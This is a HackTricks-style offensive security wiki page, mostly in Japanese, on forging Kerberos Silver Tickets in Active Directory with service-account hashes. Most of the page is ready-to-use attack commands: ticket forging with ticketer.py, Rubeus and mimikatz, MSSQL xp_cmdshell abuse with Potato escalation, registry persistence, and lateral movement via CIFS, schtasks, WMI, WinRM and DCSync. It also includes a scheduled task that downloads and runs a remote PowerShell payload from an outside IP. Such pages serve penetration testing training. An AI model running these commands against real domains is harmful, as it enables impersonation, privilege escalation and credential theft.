# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 攻撃は、Active Directory (AD) 環境におけるサービスチケットの悪用を伴います。この手法は、コンピュータアカウントのようなサービスアカウントの**NTLMハッシュを取得する**ことに依存し、そのハッシュを使って Ticket Granting Service (TGS) チケットを偽造します。偽造したチケットにより、攻撃者はネットワーク上の特定サービスにアクセスし、通常は管理権限を狙って**任意のユーザーになりすます**ことができます。チケットを偽造する際に AES キーを使う方がより安全で検出されにくいことが強調されます。

> [!WARNING]
> Silver Tickets は Golden Tickets より検出されにくいです。なぜなら要求されるのは krbtgt アカウントではなくサービスアカウントの**ハッシュ**だけだからです。ただし、対象となるサービスに限定されます。さらに、ユーザーのパスワードを単に盗むだけで可能です。
> また、SPN を持つ**アカウントのパスワード**を奪取した場合、そのパスワードを使ってそのサービスに対して任意のユーザーを偽装する Silver Ticket を作成できます。

For ticket crafting, different tools are employed based on the operating system:

### Linux上
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows上で
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.

### 例: MSSQL service (MSSQLSvc) + Potato to SYSTEM

もしSQLサービスアカウント（例: sqlsvc）のNTLMハッシュ（またはAESキー）を持っていれば、MSSQLのSPNに対するTGSを偽造して、任意のユーザとしてSQLサービスに対してなりすますことができます。そこからxp_cmdshellを有効化して、SQLサービスアカウントとしてコマンドを実行します。そのトークンにSeImpersonatePrivilegeがあれば、PotatoをチェーンしてSYSTEMに昇格させます。
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 結果のコンテキストが SeImpersonatePrivilege を持っている場合（サービスアカウントに当てはまることが多い）、Potato の亜種を使って SYSTEM を取得する:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL の悪用および xp_cmdshell の有効化の詳細:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques の概要:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 利用可能なサービス

| サービスの種類                             | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては単に要求できます: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets イベント ID

- 4624: アカウント ログオン
- 4634: アカウント ログオフ
- 4672: 管理者 ログオン

## 永続化

マシンが 30 日ごとにパスワードをローテーションするのを避けるには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` を設定するか、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を 30 日より大きな値に設定して、マシンのパスワードをいつローテーションするかを示すことができます。

## サービスチケットの悪用

以下の例では、そのチケットが管理者アカウントを偽装して取得されたと仮定します。

### CIFS

このチケットがあれば、`C$` と `ADMIN$` フォルダに **SMB** 経由でアクセスでき（公開されている場合）、次のようにしてリモートファイルシステムの一部にファイルをコピーできます：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
さらに、**psexec** を使用してホスト内でシェルを取得したり、任意のコマンドを実行したりできます:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### ホスト

この権限があれば、リモートコンピュータにスケジュールされたタスクを作成して任意のコマンドを実行できます:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらのチケットを使用すると、**標的システム上でWMIを実行できます**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで**wmiexec**に関する詳細情報を確認してください：

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

コンピュータに対して winrm アクセスがあると、そのコンピュータに**アクセス**したり、PowerShell を取得したりできます:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
次のページを参照して、**winrm を使用してリモートホストに接続する他の方法**を確認してください：


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> リモートコンピュータにアクセスするには、**winrm が有効でリッスンしている必要がある**ことに注意してください。

### LDAP

この特権があれば、**DCSync** を使用して DC のデータベースをダンプできます：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync の詳細については次のページを参照してください**


{{#ref}}
dcsync.md
{{#endref}}


## 参考

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
